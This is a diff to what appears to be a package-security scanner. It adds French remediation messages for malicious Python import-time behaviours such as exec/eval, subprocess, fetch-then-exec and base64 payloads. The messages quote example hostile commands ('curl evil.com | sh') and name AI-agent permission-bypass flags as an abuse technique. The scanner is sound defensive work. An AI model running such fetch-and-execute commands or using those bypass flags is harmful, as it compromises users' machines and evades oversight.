@@ -409,6 +409,59 @@ const PLAYBOOKS = {
     'pour inspecter le contenu reel. Supprimer le fichier ou nettoyer les caracteres invisibles ' +
     'avant toute utilisation. Si deja ouvert avec un agent IA, regenerer tous les secrets touches.',
 
+  import_time_exec:
+    'CRITIQUE: Le fichier Python (__init__.py / setup.py / module top-level) execute exec() ou eval() ' +
+    'a l\'import ou pip install. RCE immediat sur la machine de l\'utilisateur. ' +
+    'NE PAS installer ce package. Si deja installe: pip uninstall immediatement, ' +
+    'auditer les processus en cours, regenerer les credentials potentiellement compromis. ' +
+    'Inspecter le code exec/eval pour identifier le payload reel.',
+
+  import_time_subprocess:
+    'CRITIQUE: Le fichier Python spawn un processus externe (subprocess.Popen/run/call/check_output) ' +
+    'a l\'import ou pip install. Generalement utilise pour fetch + execute remote payload, ' +
+    'lateral movement, ou installation de persistence. NE PAS installer. Verifier le contenu ' +
+    'de l\'appel pour identifier la commande executee. Auditer les processus enfants si deja installe.',
+
+  import_time_os_system:
+    'CRITIQUE: Le fichier Python execute des commandes shell (os.system / os.popen / os.spawn / os.exec) ' +
+    'a l\'import ou pip install. Pattern frequent: "curl evil.com | sh" ou "wget evil.com | bash". ' +
+    'NE PAS installer. Inspecter la commande exacte. Si execute: considerer la machine compromise.',
+
+  import_time_fetch_exec:
+    'CRITIQUE: Pattern TrapDoor detecte. Le fichier Python fetch un payload depuis le reseau ' +
+    '(urllib/requests/http.client/httpx/aiohttp) ET execute du code (exec/eval) dans le meme fichier. ' +
+    'C\'est la signature directe d\'une remote-payload-then-RCE. NE PAS installer. ' +
+    'Bloquer le domaine du fetch dans le firewall. Si execute: incident response complet, ' +
+    'regenerer TOUS les secrets sur la machine (SSH, AWS, GitHub, npm, env vars).',
+
+  import_time_base64_exec:
+    'CRITIQUE: Le fichier Python base64-decode du contenu ET execute (exec/eval) dans le meme fichier. ' +
+    'Pattern d\'obfuscation classique: payload encode pour echapper a la revue + grep statique. ' +
+    'NE PAS installer. Decoder le base64 manuellement pour identifier le payload reel ' +
+    '(python3 -c "import base64; print(base64.b64decode(b\'<payload>\').decode())").',
+
+  import_time_deserialization:
+    'CRITIQUE: Le fichier Python utilise pickle/marshal/dill/cloudpickle .loads() au niveau module. ' +
+    'Ces fonctions sont triviallement RCE si l\'input deserializise vient d\'une source attaquant-controllee ' +
+    '(fichier sur disque, requete HTTP, env var). NE PAS installer si l\'origine du blob deserialize ' +
+    'n\'est pas un fichier de donnees interne au package. Si interne: verifier l\'integrite (signature, hash).',
+
+  dynamic_dangerous_import:
+    'HIGH: Le fichier Python utilise __import__() avec un nom hardcode dangereux ' +
+    '(subprocess, os, requests, urllib, socket, http, ssl, ctypes, importlib). ' +
+    'Pattern d\'obfuscation: evite "import X" statique pour bypass les scanners qui ne tracent ' +
+    'que les imports declares. Combinaison avec exec/subprocess/fetch indique malveillance. ' +
+    'Inspecter manuellement les appels suivants au module dynamiquement importe.',
+
+  python_source_unicode_obfuscation:
+    'CRITIQUE: Fichier Python contient ≥5 caracteres Unicode invisibles ' +
+    '(zero-width, directional override, variation selectors, tag characters). ' +
+    'Python rejette les identifiers avec ZW (PEP 3131 SyntaxError), donc le vecteur est ' +
+    'soit (a) obfuscation dans des strings (GlassWorm-style payload encoding via variation selectors), ' +
+    'soit (b) comments avec ZW pour induire en erreur la revue humaine. ' +
+    'NE PAS installer. Ouvrir le fichier dans un editeur affichant les caracteres invisibles ' +
+    '(VS Code: "editor.renderControlCharacters") pour inspecter le contenu reel.',
+
   ai_agent_abuse:
     'CRITIQUE: Un agent IA (Claude, Gemini, Q) est invoque avec des flags de bypass de securite ' +
     '(--dangerously-skip-permissions, --yolo, --trust-all-tools). Technique s1ngularity/Nx. ' +
